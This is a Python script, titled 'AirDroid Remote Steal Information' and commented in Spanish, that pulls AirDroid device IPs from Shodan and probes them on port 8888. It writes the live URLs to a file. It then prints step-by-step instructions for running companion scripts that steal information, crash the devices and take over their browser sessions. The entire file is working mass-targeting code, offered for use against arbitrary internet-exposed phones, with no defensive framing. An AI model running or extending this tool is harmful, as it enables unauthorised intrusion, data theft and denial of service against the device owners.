#!/usr/bin/python
# coding: utf-8

# --------------------------------------------------
# \                                                 \
# \        AirDroid Remote Steal Information        \
# \     Hecho por: Marcelo Vázquez (aka s4vitar)    \
# \                                                 \
# --------------------------------------------------

import shodan, requests, time, os, sys, signal, threading

# Usa tu API KEY de Shodan
SHODAN_API_KEY = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
api = shodan.Shodan(SHODAN_API_KEY)

def handler(signum, frame):

        print '\nSaliendo...\n'
        os.system('setterm -cursor on')
        sys.exit(0)

def checkurl(ip, available_urls):

	url = "http://" + ip + ":8888/"

	try:
        	url_check_status = requests.get(url, verify=False, timeout=3)

                if url_check_status.status_code == 200:
                	print "URL " + url + " activa!!\n"
			available_urls.append(url)
        except:
                pass

def get_IPS(ips_array):

        try:
        	results = api.search('Airdroid')
        except shodan.APIError, error:
        	print 'Error: {0}'.format(error)

        ips = []

        for result in results['matches']:
        	ips.append("{0}".format(result['ip_str']))

        for ip in ips:
                ips_array.append(ip)

if __name__ == '__main__':

	signal.signal(signal.SIGINT, handler)
        os.system('setterm -cursor off')

	available_urls = []

        print "\n[*] Obteniendo listado de IPs...\n"

	# Recopilamos todas las IPs listadas desde Shodan para Airdroid
        ips_array = []
        get_IPS(ips_array)

        print "[*] Número total de IPs obtenidas:", len(ips_array)
        time.sleep(2)

        print "\n[*] Comprobando objetivos...\n"
        time.sleep(2)

        threads = []

	for host in ips_array:
		t = threading.Thread(target=checkurl, args=(host, available_urls,))
		threads.append(t)

	for x in threads:
		x.start()

	for x in threads:
		x.join()

        print "[*] Las URLs activas han sido exportadas al fichero 'ips'...\n"
        time.sleep(2)

	f = open('ips', "w")

	for host in available_urls:
		f.write(host + '\n')

	f.close()

	print "[*] Ejecuta el script 'AttackHosts.py' para iniciar el ataque contra los activos recopilados\n"
	time.sleep(2)

	print "[*] Ejemplo...\n"
	time.sleep(1)

	print "$ python AttackHosts.py " + '\n'
	time.sleep(1)

        print "[*] También puedes hacer un ataque dirigido a un único objetivo a través del fichero 'AttackHost.py' seguido de la URL\n"
        time.sleep(2)

        print "[*] Ejemplo...\n"
        time.sleep(1)

        print "$ python AttackHost.py " + available_urls[0] + '\n'
        time.sleep(1)

        print "[*] En caso de querer elaborar el ataque Remote DoS Application & System Crash contra los activos, ejecuta los scripts 'airdroid_dos.sh' o 'airdroid_fast_dos.sh'...\n"
        time.sleep(2)

        print "[*] Ejemplo...\n"
        time.sleep(1)

        print "$ python airdroid_fast_dos.sh http://ip:8888" + '\n'
        time.sleep(1)

        print "[*] En caso de querer gestionar las sesiones del navegador, ejecuta el script 'web_browser.py'...\n"
        time.sleep(2)

        os.system('setterm -cursor on')
